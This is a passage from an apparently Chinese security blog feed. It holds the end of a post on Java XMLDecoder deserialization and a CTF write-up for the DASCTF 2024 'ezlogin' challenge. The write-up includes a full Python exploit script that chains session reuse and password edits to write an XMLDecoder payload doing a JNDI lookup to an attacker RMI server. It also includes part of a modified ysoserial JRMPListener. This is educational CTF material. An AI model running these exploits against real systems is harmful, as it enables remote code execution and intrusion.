class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testExpression</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>            <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Expression</span>(user, <span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;小明&quot;</span>&#125;);<br>            System.out.println(expression.getValue());<span class="hljs-comment">//可以获取返回值</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">张三<br>你好 小明!<br></code></pre></td></tr></table></figure><p>他们的区别就是Expression的getValue内部执行invoke方法后能够获取返回值，而Statement是没有getValue方法是获取不了返回值的</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>XMLDecoder导致漏洞的原因就在于处理节点的时候，信任了外部输入的XML指定节点类型信息（class类型节点），同时在进行节点Expression动态实例化的时候（通过invoke实现set()方法，允许节点属性由XML任意控制</p><p>导致Expression的set()方法被重载为风险函数（本例中是start）。Expression动态解析因为Java反射特性实现了代码执行。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://y4er.com/posts/java-xmldecoder">https://y4er.com/posts/java-xmldecoder</a></p><p><a href="https://www.cnblogs.com/LittleHann/p/17814641.html">https://www.cnblogs.com/LittleHann/p/17814641.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xmldecoder介绍&quot;&gt;&lt;a href=&quot;#XMLDecoder介绍&quot; class=&quot;headerlink&quot; title=&quot;XMLDecoder介绍&quot;&gt;&lt;/a&gt;XMLDecoder介绍&lt;/h1&gt;&lt;p&gt;XMLDecoder是java自带的以SAX方式解析xml的</summary>
      
    
    
    
    <category term="true" scheme="https://clowsman.github.io/categories/true/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2024金秋十月部分题目复现</title>
    <link href="https://clowsman.github.io/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/10/23/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-10-23T05:45:58.000Z</published>
    <updated>2024-10-26T08:12:26.534Z</updated>
    
    <content type="html"><![CDATA[<p>官方wp链接：<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS">https://www.yuque.com/chuangfeimeiyigeren/eeii37/xn0zhgp85tgoafrz?singleDoc#FAsbS</a></p><h1 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h1><p>就是一个正常的登录、注册、修改密码的服务，看了一下jar包</p><p><img src="https://cdn.clown2024.cn/image-20241023135607557.png" alt="image-20241023135607557"></p><p>见到熟悉的hutool，前面的ciscn题目复现才遇到，然后spring-boot那就是有jackson</p><p>当时审了半天的逻辑，发现能给传参的参数长度都限制死了，他有一个默认的xml文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- this is /user/AAAAAA.xml --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>他的用户名和密码的最大长度都是以该文件里面的长度为准</p><p><img src="https://cdn.clown2024.cn/image-20241023140248515.png" alt="image-20241023140248515"></p><p>这里有个check函数限制长度，一开始没找到什么绕过的地方，遂摆😊</p><p>这里开始跟着wp复现</p><p>看EditController内容</p><p><img src="https://cdn.clown2024.cn/image-20241026104501910.png" alt="image-20241026104501910"></p><p>这里从JSESSION中获取登录的用户，然后对用户名和新密码进行检查，再进行修改密码的操作</p><p>看一下他的changePassword方法</p><p><img src="https://cdn.clown2024.cn/image-20241026105025765.png" alt="image-20241026105025765"></p><p>这里就是简单的将xml的内容读出来，然后进行新旧密码的替换，最后重新写入，注意这里没有对JSESSION的状态改变</p><p>在del用户的地方</p><p><img src="https://cdn.clown2024.cn/image-20241026105354581.png" alt="image-20241026105354581"></p><p>也是从JSESSION中获取用户然后调用delUser方法</p><p><img src="https://cdn.clown2024.cn/image-20241026105441155.png" alt="image-20241026105441155"></p><p>这里直接就把userFile给删除了，但是他并没有重置JSESSION，意思就是我们的JSESSION可以保留下来，他还是能够识别的</p><p>反序列化的点在于login路由</p><p><img src="https://cdn.clown2024.cn/image-20241026110213423.png" alt="image-20241026110213423"></p><p>看他的login方法</p><p><img src="https://cdn.clown2024.cn/image-20241026110247575.png" alt="image-20241026110247575"></p><p>里面的一个readUser方法有对xml文件进行反序列化，然后有个waf过滤了java.、springframework.、hutool.，而且还限制了文件的最大长度，就是他初始给我们的那个AAAAAA.xml的长度</p><p><img src="https://cdn.clown2024.cn/image-20241026123012865.png" alt="image-20241026123012865"></p><p>看完前面之后漏洞点就在于changePassword的时候，因为JSESSION的状态并没有改变，所以其实我们replace的时候可以保证oldPassword是一直不变的，我们就可以多次请求修改密码，一直替换oldPassword来实现任意内容的写入，比如可以xxx&#x3D;》abcxxx，abcxxx&#x3D;》abcabcxxx；</p><blockquote><p>我们替换的时候新密码需要加上旧密码，这样可以保证我们可以可控地连续写入payload</p><p>而且我们注意写入payload之后还要缩短长度满足其小于maxLength的要求</p></blockquote><p>现在绕过长度限制写任意内容的方法有了，应该怎么写，写什么呢</p><p>因为java.被禁掉了，直接写恶意代码的方法行不通，wp直接打jndi来触发Jackson的链子，springboot是自带Jackson依赖</p><p>我们要写入的payload形式是这样的</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>rmi://ip:port/a<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>userFile的文件长这样</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.example.auth.User&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>AAAAAAAAAA<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后题目给了我们&lt;!–这样一个提示，意思让我们利用html的注释，也就是写入自己的payload将其他部分注释掉，使自己的写入的xml生效</p><p>那完整的写法思路就是利用JSESSION保留的性质，我们去重复注册删除同一个用户，然后每次注册进去都是我们想要的oldPassword对应我们要替换的xml关键字，当JSESSION搜集够了之后就可以去改该用户的xml了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.将java替换成!--来注释掉中间的内容<br>2.注册获取各个标签的JSESSION<br>3.注册一个password为特定标识符用于替换的，比如wp就用_____来作为标识<br>4.对各部分进行替换<br></code></pre></td></tr></table></figure><p>wp的payload形式如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义RMIServer地址</span><br>rmiserver = <span class="hljs-string">&quot;test&quot;</span><br><br><span class="hljs-comment"># 构造恶意Java序列化payload，用于触发漏洞</span><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span> + rmiserver + <span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br><br><span class="hljs-comment"># 初始化列表，用于存储分块后的payload</span><br>list1 = []<br><br><span class="hljs-comment"># 遍历payload，每5个字符进行分块，并对最后一块进行特殊处理</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload1), <span class="hljs-number">5</span>):<br>    <span class="hljs-comment"># 如果剩余字符大于等于5个，则正常分块并填充下划线</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i + <span class="hljs-number">5</span>:] + <span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 如果剩余字符不足5个，则直接添加到列表中，并结束循环</span><br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># 打印初步处理后的列表</span><br><span class="hljs-built_in">print</span>(list1)<br><br><span class="hljs-comment"># 如果列表中最后一个元素长度小于3，则进行特殊处理以构造特定的输出格式</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    <span class="hljs-comment"># 将倒数第二个元素的后三个字符与最后一个元素合并，以保持信息的连续性</span><br>    list1[-<span class="hljs-number">1</span>] = list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:] + list1[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 修正倒数第二个元素，保留其大部分内容并去除最后一个字符，为其后续与新的最后一个元素合并做准备</span><br>    list1[-<span class="hljs-number">2</span>] = list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><br><span class="hljs-comment"># 打印最终处理后的列表</span><br><span class="hljs-built_in">print</span>(list1)<br></code></pre></td></tr></table></figure><p>exp就直接用wp的</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br>targeturl = sys.argv[<span class="hljs-number">1</span>] <span class="hljs-comment">#靶机地址</span><br><br>rmiserver = sys.argv[<span class="hljs-number">2</span>] <span class="hljs-comment">#rmi服务器地址</span><br><br>sessions = &#123;&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/register&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span> : <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;register fail: <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getsession</span>(<span class="hljs-params">passwd</span>):<br>    data=&#123;<span class="hljs-string">&quot;password&quot;</span>:passwd,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>&#125;<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">in</span> res.text.lower() :<br>        session=res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>).split(<span class="hljs-string">&quot;;&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;session for <span class="hljs-subst">&#123;passwd&#125;</span> : <span class="hljs-subst">&#123;session&#125;</span>&quot;</span>)<br>        headers = &#123;<span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">f&quot;JSESSIONID=<span class="hljs-subst">&#123;session&#125;</span>&quot;</span>&#125;<br>        sessions[passwd] = headers<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;login fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">editpass</span>(<span class="hljs-params">oldpass,newpass</span>):<br>    data=&#123;<span class="hljs-string">&quot;newPass&quot;</span>:newpass&#125;<br>    headers = sessions[oldpass]<br>    res = requests.post(targeturl+<span class="hljs-string">&quot;/editPass&quot;</span>,data=data,headers=headers)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;change <span class="hljs-subst">&#123;oldpass&#125;</span> to <span class="hljs-subst">&#123;newpass&#125;</span> success&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;edit fail : <span class="hljs-subst">&#123;res.text&#125;</span>&quot;</span>);exit(<span class="hljs-number">114514</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">deluser</span>(<span class="hljs-params">passwd</span>):<br>    res = requests.get(targeturl+<span class="hljs-string">&quot;/del&quot;</span>,headers=sessions[passwd])<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;success&quot;</span> <span class="hljs-keyword">in</span> res.text.lower():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;delete <span class="hljs-subst">&#123;passwd&#125;</span> success&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addsession</span>(<span class="hljs-params">passwd</span>):<br>    register(passwd)<br>    getsession(passwd)<br>    deluser(passwd)<br><br>payload1 = <span class="hljs-string">&quot;--&gt;&lt;java&gt;&lt;object class=\&quot;javax.naming.InitialContext\&quot;&gt;&lt;void method=\&quot;lookup\&quot;&gt;&lt;string&gt;rmi://&quot;</span>+rmiserver+<span class="hljs-string">&quot;/a&lt;/string&gt;&lt;/void&gt;&lt;/object&gt;&lt;/java&gt;&lt;!--&quot;</span><br>list1 = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),<span class="hljs-number">5</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload1) - i &gt;= <span class="hljs-number">5</span>:<br>        list1.append(payload1[i:i+<span class="hljs-number">5</span>:]+<span class="hljs-string">&quot;_____&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        list1.append(payload1[i:<span class="hljs-built_in">len</span>(payload1)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list1)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(list1[-<span class="hljs-number">1</span>]) &lt; <span class="hljs-number">3</span>:<br>    list1[-<span class="hljs-number">1</span>]=list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">8</span>:-<span class="hljs-number">5</span>:]+list1[-<span class="hljs-number">1</span>]<br>    list1[-<span class="hljs-number">2</span>]=list1[-<span class="hljs-number">2</span>][<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+list1[-<span class="hljs-number">2</span>][-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(list1)<br><br><br>list2=[]<br>payload2=<span class="hljs-string">&quot;11111 class=\&quot;org.example.auth.User\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload2),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload2) - i &gt;= <span class="hljs-number">10</span>:<br>        list2.append(payload2[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list2.append(payload2[i:<span class="hljs-built_in">len</span>(payload2)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list2)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    addsession(s)<br><br>list3=[]<br>payload3=<span class="hljs-string">&quot;void property=\&quot;username\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload3),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload3) - i &gt;= <span class="hljs-number">10</span>:<br>        list3.append(payload3[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list3.append(payload3[i:<span class="hljs-built_in">len</span>(payload3)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list3)<br><br><br>list4=[]<br>payload4=<span class="hljs-string">&quot;void property=\&quot;password\&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload4),<span class="hljs-number">10</span>) :<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(payload4) - i &gt;= <span class="hljs-number">10</span>:<br>        list4.append(payload4[i:i+<span class="hljs-number">10</span>:])<br>    <span class="hljs-keyword">else</span>:<br>        list4.append(payload4[i:<span class="hljs-built_in">len</span>(payload4)])<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(list4)<br><br><br><br>addsession(<span class="hljs-string">&quot;_____&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;____&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    addsession(s)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    addsession(s)<br><br>addsession(<span class="hljs-string">&quot;string&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;object&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/void&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;    &quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;1111111111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;/11111&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;java&quot;</span>)<br><br>addsession(<span class="hljs-string">&quot;11111&quot;</span>)<br><br>register(<span class="hljs-string">&quot;haha&quot;</span>)<br>getsession(<span class="hljs-string">&quot;haha&quot;</span>)<br>editpass(<span class="hljs-string">&quot;java&quot;</span>,<span class="hljs-string">&quot;!--&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;string&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;object&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/11111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;    &quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;/void&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list2:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list3:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> list4:<br>    editpass(s,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br>editpass(<span class="hljs-string">&quot;1111111111&quot;</span>,<span class="hljs-string">&quot;11111&quot;</span>)<br><br>editpass(<span class="hljs-string">&quot;haha&quot;</span>,list1[<span class="hljs-number">0</span>])<br><br>editpass(<span class="hljs-string">&quot;11111&quot;</span>,<span class="hljs-string">&quot;111&quot;</span>)<br><br><span class="hljs-comment"># Now it&#x27;s the shortest (237)</span><br><br><span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> list1[<span class="hljs-number">1</span>::]:<br>    editpass(<span class="hljs-string">&quot;_____&quot;</span>,payload)<br><br>editpass(<span class="hljs-string">&quot;____&quot;</span>,<span class="hljs-string">&quot;&lt;!--&quot;</span>)<br><br>requests.post(targeturl+<span class="hljs-string">&quot;/login&quot;</span>,data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p>将JRMPListener修改一下，我的修改方式如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.exploit;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.net.InetSocketAddress;<br><span class="hljs-keyword">import</span> java.net.ServerSocket;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.net.SocketException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.rmi.MarshalException;<br><span class="hljs-keyword">import</span> java.rmi.server.ObjID;<br><span class="hljs-keyword">import</span> java.rmi.server.UID;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> sun.rmi.transport.TransportConstants;<br><span class="hljs-keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Generic JRMP listener</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Opens up an JRMP listener that will deliver the specified payload to any</span><br><span class="hljs-comment"> * client connecting to it and making a call.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> mbechler</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings</span> ( &#123;<br>    <span class="hljs-string">&quot;restriction&quot;</span><br>&#125; )<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;<br>    <span class="hljs-keyword">private</span> Object payloadObject;<br>    <span class="hljs-keyword">private</span> ServerSocket ss;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">Object</span> <span class="hljs-variable">waitLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> exit;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> hadConnection;<br>    <span class="hljs-keyword">private</span> URL classpathUrl;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, Object payloadObject )</span> <span class="hljs-keyword">throws</span> NumberFormatException, IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = payloadObject;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JRMPListener</span><span class="hljs-params">(<span class="hljs-type">int</span> port, String className, URL classpathUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.port = port;<br>        <span class="hljs-built_in">this</span>.payloadObject = makeDummyObject(className);<br>        <span class="hljs-built_in">this</span>.classpathUrl = classpathUrl;<br>        <span class="hljs-built_in">this</span>.ss = ServerSocketFactory.getDefault().createServerSocket(<span class="hljs-built_in">this</span>.port);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">waitFor</span> <span class="hljs-params">( <span class="hljs-type">int</span> i )</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.hadConnection ) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            System.err.println(<span class="hljs-string">&quot;Waiting for connection&quot;</span>);<br>            <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>                <span class="hljs-built_in">this</span>.waitLock.wait(i);<br>            &#125;<br>            <span 